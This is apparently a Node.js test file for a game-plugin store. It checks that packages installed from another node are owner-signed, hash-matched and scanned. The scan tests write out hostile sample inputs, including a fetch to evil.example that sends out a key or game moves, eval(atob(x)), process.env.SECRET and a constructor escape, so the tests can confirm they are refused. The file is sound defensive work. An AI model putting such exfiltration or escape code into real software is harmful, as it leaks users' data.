// THE PLUGIN STORE (kanban #276 step 5, the owner 2026-10-09: "See what other nodes host. Install it. Always scan for malicious
// code before install"; 2026-10-10: "games can be downloaded from other nodes"): a seat hands a hosted game over as a package;
// another seat's owner installs it - its manifest, donation set and every file checked byte for byte, its code scanned -
// and it runs from that seat's next start. A doctored file, code that reaches out, or an install not signed by the owner
// is refused.
import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdtempSync, existsSync, readdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { schnorr } from '@noble/curves/secp256k1.js';
import { openStore } from '../src/store.js';
import { serve } from '../src/server.js';
import { packageOf, verifyPackage, scanSource, loadInstalled } from '../src/plugin-package.js';
import { verifyEd25519 } from '../src/ed25519.js';
import { ownerSecretFromSeed, signOwnerRequest } from '../src/owner.js';
import { ROCK_PAPER_SCISSORS } from '../../rock-paper-scissors/plugin/rock-paper-scissors.js';
import { testHeadToHeadGame, testDonationSet } from './plugins/sign.js';
import { toHex } from '../../arena-protocol/src/hash.js';
import { encodeManifest } from '../../arena-protocol/src/manifest.js';

const sha = (b) => createHash('sha256').update(b).digest('hex');
const RPS_ID = toHex(ROCK_PAPER_SCISSORS.gameId);

test('a hosted game as a package: Rock Paper Scissors stands, its files are its manifest\'s, its code passes the scan', () => {
  const pkg = packageOf(ROCK_PAPER_SCISSORS);
  assert.equal(pkg.cores.length, 1);
  assert.equal(pkg.clients.length, 1);
  const v = verifyPackage(pkg, { verify: verifyEd25519, want: RPS_ID });
  assert.equal(v.ok, true, v.why);
  assert.equal(v.name, 'rock-paper-scissors');
});

test('a doctored file, a client the manifest does not name, or another game\'s id is refused by name', () => {
  const pkg = packageOf(ROCK_PAPER_SCISSORS);
  const src = Buffer.from(pkg.cores[0].source, 'base64').toString('utf8').replace("'WIN'", "'LOSS'");
  const doctored = { ...pkg, cores: [{ ...pkg.cores[0], source: Buffer.from(src).toString('base64') }] };
  assert.match(verifyPackage(doctored, { verify: verifyEd25519 }).why, /its source is not the file its manifest names/);
  const otherClient = { ...pkg, clients: [{ hash: sha(Buffer.from('<html>other</html>')), body: Buffer.from('<html>other</html>').toString('base64') }] };
  assert.match(verifyPackage(otherClient, { verify: verifyEd25519 }).why, /not a client its manifest names/);
  assert.match(verifyPackage(pkg, { verify: verifyEd25519, want: 'ab'.repeat(32) }).why, /not abababab/);
});

test('the scan: code that loads modules, evaluates, reaches the network, the file system or the global scope is refused', () => {
  assert.deepEqual(scanSource('export const DECIDE = { decide(m) { return {}; } };'), []);
  const rules = (s) => scanSource(s).map((f) => f.rule);
  assert.deepEqual(rules("import fs from 'node:fs';"), ['loads another module']);
  assert.deepEqual(rules('const x = await import("http");'), ['loads another module']);
  assert.deepEqual(rules('eval(atob(x))'), ['evaluates code']);
  assert.deepEqual(rules('fetch("https://evil.example/" + key)'), ['reaches the network']);
  assert.deepEqual(rules('process.env.SECRET'), ['reaches the file system or the process']);
  assert.deepEqual(rules('globalThis.x = 1'), ['reaches the global scope']);
  assert.deepEqual(rules('(()=>{}).constructor.constructor("return this")()'), ['reaches its own constructor']);
  // a game signed by its developer whose decide adapter reaches the network: its hashes match, the scan still refuses it
  const bad = 'export const DECIDE = { name: "bad", decide(moves) { fetch("https://evil.example/?m=" + JSON.stringify(moves)); return {}; } };';
  const core = { name: 'bad', hash: sha(Buffer.from(bad)), adapter: null, configs: new Map([['11'.repeat(32), {}]]) };
  const game = testHeadToHeadGame({ name: 'bad-game', core });
  const pkg = { format: 'arena-plugin/v1', name: 'bad-game', manifest: toHex(encodeManifest(game.manifest)), donationSet: testDonationSet('bad-game').map((r) => ({ recipientPk: toHex(r.recipientPk), shareBps: r.shareBps, label: r.label })),
    cores: [{ hash: core.hash, name: 'bad', configs: ['11'.repeat(32)], source: Buffer.from(bad).toString('base64') }], clients: [] };
  const v = verifyPackage(pkg, { verify: verifyEd25519 });
  assert.equal(v.ok, false);
  assert.match(v.why, /the scan refuses it: reaches the network \(line 1\)/);
});

test('install from another seat: signed by the owner, checked, kept; loaded at the next start, its adapter plays', async () => {
  const a = await serve(openStore(), { plugins: [ROCK_PAPER_SCISSORS], port: 0 });
  const dir = mkdtempSync(join(tmpdir(), 'arena-plugins-'));
  const seed = new Uint8Array(32).fill(7), secret = ownerSecretFromSeed(seed);
  const rec = { pubkey: toHex(schnorr.getPublicKey(secret)), claimedAtMs: 1 };
  const b = await serve(openStore(), { plugins: [], port: 0, pluginsDir: dir, owner: { store: { read: () => rec, write: () => {}, writeCode: () => {} } } });
  try {
    const A = `http://127.0.0.1:${a.port}`, B = `http://127.0.0.1:${b.port}`;
    const node = (await (await fetch(`${B}/owner`)).json()).node;
    const req = (args, s = secret) => signOwnerRequest({ node, action: 'install', args, secret: s, sign: (m, k) => schnorr.sign(m, k), pubkeyOf: (k) => schnorr.getPublicKey(k) });
    const post = (body) => fetch(`${B}/owner/plugins/install`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });
    assert.equal((await post(req({ game: RPS_ID, from: A }, ownerSecretFromSeed(new Uint8Array(32).fill(9))))).status, 403, 'not the owner');
    assert.equal((await fetch(`${A}/plugin?game=${'ab'.repeat(32)}`)).status, 404);
    const r = await post(req({ game: RPS_ID, from: A }));
    const j = await r.json();
    assert.equal(r.status, 200, j.why);
    assert.equal(j.name, 'rock-paper-scissors');
    assert.ok(existsSync(join(dir, RPS_ID, 'package.json')));
    const list = await (await fetch(`${B}/owner/plugins`)).json();
    assert.deepEqual(list.installed.map((x) => [x.id, x.running]), [[RPS_ID, false]], 'installed, running from the next start');
    // the next start: loaded, checked again, and its decide adapter plays rock against scissors
    const got = await loadInstalled(dir, { verify: verifyEd25519 });
    assert.deepEqual(got.refused, []);
    assert.equal(toHex(got.registrations[0].gameId), RPS_ID);
    const [core] = [...got.registrations[0].cores.values()];
    assert.deepEqual(core.adapter.decide([{ key: 'a', move: 0 }, { key: 'b', move: 2 }]), { a: 'WIN', b: 'LOSS' });
    assert.deepEqual(readdirSync(join(dir, RPS_ID)).sort().map((f) => f.split('-')[0]), ['client', 'core', 'package.json']);
  } finally { await a.close(); await b.close(); }
});
